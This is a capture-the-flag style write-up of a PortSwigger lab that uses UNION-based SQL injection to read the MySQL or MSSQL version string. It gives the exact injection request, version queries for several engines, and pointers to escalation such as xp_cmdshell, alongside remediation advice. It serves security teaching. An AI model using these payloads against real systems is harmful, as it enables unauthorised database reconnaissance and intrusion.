# SQL Injection: SQL Injection Attack, Querying the Database Type and Version on MySQL and Microsoft

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
SQL Injection via UNION Attack, Database Fingerprinting (CWE-89)

## Lab Objective
Exploit a `UNION` injection vulnerability in the product category filter to retrieve and display the database's version string — the first genuinely useful piece of reconnaissance an attacker performs once a `UNION` injection point is confirmed.

## Vulnerability Overview
This lab picks up exactly where the earlier `UNION`-attack labs in this portfolio left off: column count has been enumerated, and a text-compatible column identified. The next natural question in any real SQL injection engagement is **what database engine and version are actually running** — this single piece of information determines which SQL dialect, built-in functions, schema layout, and further attack techniques (e.g. stacked queries, `xp_cmdshell` on MSSQL, `LOAD_FILE` on MySQL) are even available. Querying it is a standard, low-risk reconnaissance step performed before attempting anything more invasive.

Conveniently, nearly every major SQL dialect exposes version information through a special, built-in value — but the *exact syntax* differs by database engine, which is itself diagnostic. Attempting both and observing which one succeeds (or fails with a specific syntax error) is often enough to fingerprint the backend without any prior knowledge of what it is:

| Database | Version Query |
|----------|----------------|
| MySQL | `SELECT @@version` |
| Microsoft SQL Server | `SELECT @@version` |
| Oracle | `SELECT banner FROM v$version` |
| PostgreSQL | `SELECT version()` |

Notably, **MySQL and Microsoft SQL Server share the identical syntax** (`@@version`) — this is precisely why this lab trains on both: the technique is syntactically indistinguishable between them at the `UNION` injection level, and differentiating the two in practice comes down to reading the *content* of the returned string, not the query used to retrieve it.

## Methodology
1. **Re-establish the `UNION` injection point** in the category filter, as covered in the earlier labs in this series — determine the column count and identify which column(s) accept and display string data.
2. **Substitute the database's version function** into the confirmed text-compatible column position, in place of the literal test string used during column enumeration.
3. **Submit the request and read the returned version string directly** from the rendered response.
4. **Interpret the string's content** to confirm which specific database engine is in use, since the query syntax alone doesn't distinguish MySQL from MSSQL.

---

## Exploitation

**Step 1:** Intercept the category filter request in Burp Suite and send it to **Repeater**:

```http
GET /filter?category=Gifts HTTP/1.1
```

**Step 2:** Re-confirm the column count and the position of the text-compatible column using the enumeration technique from the earlier `UNION` attack labs (e.g. `ORDER BY` or `UNION SELECT NULL,NULL,NULL--`). For this walkthrough, assume three columns with the second being string-compatible.

**Step 3:** Submit a `UNION SELECT` with the version function in the confirmed text column position:

```http
GET /filter?category=Gifts'+UNION+SELECT+NULL,@@version,NULL--
```

**Step 4:** The response renders the database's version string directly in place of the normal product listing content, for example:

```
8.0.35-0ubuntu0.22.04.1
```

or, on an MSSQL backend:

```
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
```

**Step 5:** Reading the returned string confirms the exact database engine and version in use, solving the lab regardless of which of the two engines is actually running underneath — the identical `@@version` syntax works against both.

**Why it works:** Both MySQL and Microsoft SQL Server expose version information through a global, read-only system variable named `@@version`, accessible from any query context without requiring any special privileges. Because the `UNION SELECT` injection already established a working channel for returning arbitrary attacker-chosen values from the database back into the application's rendered response, substituting a literal string (used earlier to find the right column) for this system variable costs nothing extra — the exact same injection mechanics apply, only the selected expression changes.

## Impact
- **Precise attack-surface fingerprinting:** knowing the exact engine and version immediately narrows down which further SQL injection techniques are viable (stacked queries, specific built-in functions, known version-specific vulnerabilities) and which are a waste of time to attempt.
- **Low-noise reconnaissance:** version fingerprinting via a built-in variable is a single, simple query — unlikely to trigger the kind of anomaly detection that more aggressive enumeration techniques (e.g. heavy `UNION`-based data dumps) might.
- **Enables dialect-specific escalation:** real-world exploitation chains almost always start with this step before moving to database-specific techniques — e.g. confirming MySQL opens the door to testing `LOAD_FILE()`/`INTO OUTFILE` for file read/write primitives, while confirming MSSQL opens the door to testing `xp_cmdshell` for OS command execution.

## Remediation
- **Use parameterised queries (prepared statements) universally.** As with every SQL injection lab in this portfolio, this is the only fix that closes off the injection point entirely — once input cannot alter query structure, no amount of enumeration (version fingerprinting included) is possible through this vector.
- **Suppress detailed database error messages in production.** While this specific lab didn't require triggering an error, version and dialect information frequently leaks through verbose error messages as well — a defense-in-depth measure independent of the primary fix.
- **Apply least-privilege database accounts.** Restricting the application's database user from accessing system variables/catalog views where not functionally required adds a layer of friction, though it should never be relied upon as a primary control.
- **Monitor for anomalous queries referencing system variables or catalog views** (`@@version`, `information_schema`, `v$version`, etc.) in application-layer query logs, as these are a strong signal of active reconnaissance.

## Key Takeaways
- Version fingerprinting via `@@version`, `version()`, or equivalent is a standard, almost-universal first step once any `UNION` injection point is confirmed — it should be close to reflexive, not an afterthought.
- MySQL and Microsoft SQL Server sharing identical `@@version` syntax is a useful fact to know precisely because it means **the query itself won't tell you which engine you're dealing with** — only the returned content will, and recognizing the distinct version-string format of each engine (e.g. MySQL's semantic-versioning style vs. MSSQL's verbose product banner) is a skill worth having memorized.
- This lab is a clean demonstration that `UNION` injection is not just a data-exfiltration primitive for application data — it's equally a reconnaissance tool against the database platform itself, and real-world attackers almost always use it for both.
- Database fingerprinting via SQL injection complements, rather than replaces, other fingerprinting techniques (error-based disclosure, response timing, banner grabbing on the DB port if directly reachable) — a thorough engagement would cross-reference multiple signals rather than relying on one query alone.

## Tools Used
- Burp Suite (Proxy, Repeater)
- Web browser

## Disclaimer
This writeup documents an intentionally vulnerable lab on PortSwigger Web Security Academy for educational purposes. Only test systems you own or have explicit written permission to assess.